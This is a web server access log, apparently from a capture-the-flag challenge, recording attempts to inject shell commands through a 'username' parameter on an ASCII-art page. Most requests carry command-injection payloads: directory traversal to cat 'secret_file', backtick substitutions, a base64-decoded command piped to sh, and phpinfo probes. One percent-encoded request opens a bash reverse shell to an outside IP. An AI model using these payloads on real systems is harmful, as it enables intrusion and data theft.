58.187.43.105 - - [28/Aug/2022:07:38:47 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=toilet HTTP/1.1" 200 1139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:38:49 +0000] "GET /index.php?username=%5C%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random HTTP/1.1" 200 1296 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:38:54 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:38:58 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=gnu HTTP/1.1" 200 1323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:39:02 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=toilet HTTP/1.1" 200 1139 "http://128.199.190.141:5551/index.php?username=%5C%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:39:26 +0000] "GET /index.php?username=%2560pwd%2560&type=figlet HTTP/1.1" 200 1251 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250acd%2509..%250acd%2509..%250acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:39:27 +0000] "GET /index.php?username=%2560pwd%2560&type=figlet HTTP/1.1" 200 1251 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250acd%2509..%250acd%2509..%250acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:39:49 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:39:52 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:40:42 +0000] "GET /index.php?username=%27cd%09..%5Ccd%09..%5Ccd%09..%5Ccd%09root%5Ccat%09secret_file%5C&type=gnu HTTP/1.1" 200 1325 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:41:32 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=gnu HTTP/1.1" 200 1323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:41:42 +0000] "GET /index.php?username=cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:41:51 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:41:55 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1142 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:42:09 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:42:28 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:42:30 +0000] "GET /index.php?username=%2560pwd%2560&type=figlet HTTP/1.1" 200 1251 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250acd%2509..%250acd%2509..%250acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
171.253.1.35 - - [28/Aug/2022:07:42:36 +0000] "GET /index.php?username=%60&type=random HTTP/1.1" 200 1184 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Als%2509%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:42:41 +0000] "GET /index.php?username=%60&type=figlet HTTP/1.1" 200 1121 "http://128.199.190.141:5551/index.php?username=%60&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:42:46 +0000] "GET /index.php?username=%27cd%09..%5Ccd%09..%5Ccd%09..%5Ccd%09root%5Ccat%09secret_file%5C&type=figlet HTTP/1.1" 200 1076 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:43:01 +0000] "-" 408 0 "-" "-"
171.253.1.35 - - [28/Aug/2022:07:43:04 +0000] "GET /index.php?username=%60%60&type=figlet HTTP/1.1" 200 1121 "http://128.199.190.141:5551/index.php?username=%60&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:43:09 +0000] "GET /index.php?username=%60%2F%60&type=random HTTP/1.1" 200 1170 "http://128.199.190.141:5551/index.php?username=%60%60&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:43:29 +0000] "GET /index.php?username=%2560&type=random HTTP/1.1" 200 1169 "http://128.199.190.141:5551/index.php?username=%60%2F%60&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:43:31 +0000] "-" 408 0 "-" "-"
171.253.1.35 - - [28/Aug/2022:07:43:59 +0000] "GET /index.php?username=%2560%250a&type=figlet HTTP/1.1" 200 1006 "http://128.199.190.141:5551/index.php?username=%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:44:18 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:44:54 +0000] "GET /?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:45:09 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:45:17 +0000] "GET /index.php?username=%27+hello&type=gnu HTTP/1.1" 200 1247 "http://128.199.190.141:5551/index.php?username=%2560pwd%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:45:47 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=gnu HTTP/1.1" 200 1298 "http://128.199.190.141:5551/index.php?username=%27+hello&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:45:55 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1105 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:46:25 +0000] "GET /index.php?debug HTTP/1.1" 200 2601 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:48:58 +0000] "GET /index.php?username=%27cd%09..%5ccd%09..%5Ccd%09..%5Ccd%09root%5Ccat%09secret_file%5C&type=figlet HTTP/1.1" 200 1076 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:49:29 +0000] "GET /index.php?username=%27cd%09..%09%5ccd%09..%5Ccd%09..%5Ccd%09root%5Ccat%09secret_file%5C&type=figlet HTTP/1.1" 200 1081 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:49:36 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1142 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:50:18 +0000] "GET /index.php?username=%27cd%09..%3B%5ccd%09..%5Ccd%09..%5Ccd%09root%5Ccat%09secret_file%5C&type=figlet HTTP/1.1" 200 1076 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:50:23 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:51:10 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:52:33 +0000] "GET /index.php?username=echo%2520%2522Y2F0IC9zZWNyZXRfZmlsZQo%253D%2522%2520%257C%2520base64%2520%252Dd%2520%257C%2520sh%250A&type=figlet HTTP/1.1" 200 1581 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:52:54 +0000] "GET /index.php?username=echo%2520%2522Y2F0IC9zZWNyZXRfZmlsZQo%253D%2522%2520%257C%2520base64%2520%252Dd%2520%257C%2520sh%250A&type=figlet HTTP/1.1" 200 1581 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:53:57 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:54:48 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:54:53 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:54:56 +0000] "GET /index.php?username=cszxc&type=gnu HTTP/1.1" 200 1281 "http://128.199.190.141:5551/index.php?username=%27cd%09..%3B%5ccd%09..%5Ccd%09..%5Ccd%09root%5Ccat%09secret_file%5C&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:55:04 +0000] "GET /index.php?username=asddsa&type=elephant HTTP/1.1" 200 1313 "http://128.199.190.141:5551/index.php?username=cszxc&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:55:25 +0000] "GET /index.php?username=asd&type=elephant HTTP/1.1" 200 1183 "http://128.199.190.141:5551/index.php?username=asddsa&type=elephant" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:55:45 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:55:52 +0000] "GET /index.php?username=%2527echo%2520%2522Y2F0IC9zZWNyZXRfZmlsZQo%253D%2522%2520%257C%2520base64%2520%252Dd%2520%257C%2520sh&type=figlet HTTP/1.1" 200 1057 "http://128.199.190.141:5551/index.php?username=echo%2520%2522Y2F0IC9zZWNyZXRfZmlsZQo%253D%2522%2520%257C%2520base64%2520%252Dd%2520%257C%2520sh%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
171.253.1.35 - - [28/Aug/2022:07:55:52 +0000] "GET /log HTTP/1.1" 404 459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:56:17 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:56:45 +0000] "GET /index.php?username=%70%63%6e%74%6c%5f%65%78%65%63%28%22%2f%62%69%6e%2f%62%61%73%68%22%2c%20%5b%22%2d%63%22%2c%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%33%2e%33%32%2e%33%30%2e%31%2f%34%34%34%34%20%30%3e%26%31%22%5d%29%3b%25%32%45%37%25%63%68%6f%20%25%32%46%73%33%63%72%65%54%5f%66%31%6c%65%62%60%2a%2f%22%62%29&type=figlet HTTP/1.1" 200 1696 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:56:53 +0000] "GET / HTTP/1.1" 200 1185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:56:53 +0000] "GET /style.css HTTP/1.1" 200 919 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:56:53 +0000] "GET /demo.png HTTP/1.1" 200 103014 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:56:55 +0000] "GET /favicon.ico HTTP/1.1" 404 459 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:58:17 +0000] "GET /index.php?username=id&type=figlet HTTP/1.1" 200 1138 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:58:53 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:59:05 +0000] "GET /index.php?username=hfg&type=gnu HTTP/1.1" 200 1279 "http://128.199.190.141:5551/index.php?username=asd&type=elephant" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:09 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Anl%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:21 +0000] "GET /index.php?username=`ls%20-l`&type=gnu HTTP/1.1" 200 1284 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:59:21 +0000] "GET /index.php?username=%2560%250a&type=figlet HTTP/1.1" 200 1006 "http://128.199.190.141:5551/index.php?username=%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:59:21 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:28 +0000] "GET /index.php?username=id&type=figlet HTTP/1.1" 200 1138 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:28 +0000] "GET /index.php?username=id&type=figlet HTTP/1.1" 200 1138 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:28 +0000] "GET /index.php?username=`ls%20-l`&type=figlet HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id&type=figlet HTTP/1.1" 200 1138 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id&type=figlet HTTP/1.1" 200 1138 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id&type=figlet HTTP/1.1" 200 1138 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php HTTP/1.1" 200 1167 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id%3Becho%20%24%28%286515%2B7098%29%29%2526%2526echo%20%24%28%286515%2B7098%29%29%7C%7Cecho%20%24%28%286515%2B7098%29%29&type=figlet HTTP/1.1" 200 1373 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id%3Becho%20%24%28%286515%2B7098%29%29%2526%2526echo%20%24%28%286515%2B7098%29%29%7C%7Cecho%20%24%28%286515%2B7098%29%29&type=figlet HTTP/1.1" 200 1373 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id%3Becho%20%24%28%286515%2B7098%29%29%2526%2526echo%20%24%28%286515%2B7098%29%29%7C%7Cecho%20%24%28%286515%2B7098%29%29&type=figlet HTTP/1.1" 200 1373 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id%3Becho%20%24%28%286515%2B7098%29%29%2526%2526echo%20%24%28%286515%2B7098%29%29%7C%7Cecho%20%24%28%286515%2B7098%29%29&type=figlet HTTP/1.1" 200 1373 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:29 +0000] "GET /index.php?username=id%7Cset%20/a%20%286515%2B7098%29%26set%20/a%20%286515%2B7098%29&type=figlet HTTP/1.1" 200 1312 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id%7Cset%20/a%20%286515%2B7098%29%26set%20/a%20%286515%2B7098%29&type=figlet HTTP/1.1" 200 1312 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id%7Cset%20/a%20%286515%2B7098%29%26set%20/a%20%286515%2B7098%29&type=figlet HTTP/1.1" 200 1312 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id%7Cset%20/a%20%286515%2B7098%29%26set%20/a%20%286515%2B7098%29&type=figlet HTTP/1.1" 200 1312 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id.print%28phpinfo%28%29%29&type=figlet HTTP/1.1" 200 1251 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id.print%28phpinfo%28%29%29&type=figlet HTTP/1.1" 200 1251 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id.print%28phpinfo%28%29%29&type=figlet HTTP/1.1" 200 1251 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id.print%28phpinfo%28%29%29&type=figlet HTTP/1.1" 200 1251 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id.print%28exec%28phpinfo%28%29%29%29&type=figlet HTTP/1.1" 200 1291 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:59:30 +0000] "GET /index.php?username=id.print%28exec%28phpinfo%28%29%29%29&type=figlet HTTP/1.1" 200 1291 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:43 +0000] "GET /index.php?username=id&type=figlet HTTP/1.1" 200 1138 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:59:44 +0000] "-" 408 0 "-" "-"
171.253.1.35 - - [28/Aug/2022:07:59:50 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1868 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
